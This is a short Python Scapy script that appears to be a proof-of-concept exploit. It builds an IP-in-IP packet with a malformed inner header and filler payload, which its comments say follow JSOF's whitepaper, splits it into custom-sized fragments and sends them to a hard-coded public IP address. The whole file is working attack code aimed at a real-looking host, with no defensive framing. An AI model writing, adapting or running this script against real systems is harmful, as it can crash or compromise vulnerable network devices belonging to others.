import scapy.all
import sys
from scapy.all import *
target = '45.95.235.60'
def fragmentCustom(self):
    """
    Modified version of Scapy's "fragment" function 
    to create custom-size fragments instead of fixed-size
    ones.
 
    We create one with payload length of 24, as in whitepaper,
    then the rest (136) bytes of payload go in the second one.
    """
    lst = []
    fnb = 0
    fl = self
    while fl.underlayer is not None:
        fnb += 1
        fl = fl.underlayer
 
    for p in fl:
 
        s = raw(p[fnb].payload)
 
        # first fragment
        q = p.copy()
        del(q[fnb].payload)
        del(q[fnb].chksum)
        del(q[fnb].len)
        q[fnb].flags |= 1 # set fragmentation to true
        q[fnb].frag += 0
        r = conf.raw_layer(load=s[0:24]) # copy first 24 bytes
        r.overload_fields = p[fnb].payload.overload_fields.copy()
        q.add_payload(r)
        lst.append(q)
 
        # second fragment
        q = p.copy()
        del(q[fnb].payload)
        del(q[fnb].chksum)
        del(q[fnb].len)
        q[fnb].frag += 3
        r = conf.raw_layer(load=s[24:]) # copy the rest
        r.overload_fields = p[fnb].payload.overload_fields.copy()
        q.add_payload(r)
        lst.append(q)
 
    return lst

innerPayload = "\x00"*40 + "\x41"*100 # as described in JSOF's whitepaper 
innerPacket = IP(ihl=0xf, len=100, proto=0, dst=target)
innerPacket.add_payload(innerPayload.encode("ascii"))


outerPacket = IP(dst=target,id=0xabcd)/innerPacket
frags = fragmentCustom(outerPacket)
#srloop(frags).show()

for f in frags:
    ans, unans = sr(f)
    print(unans.show())
    print(unans.summary())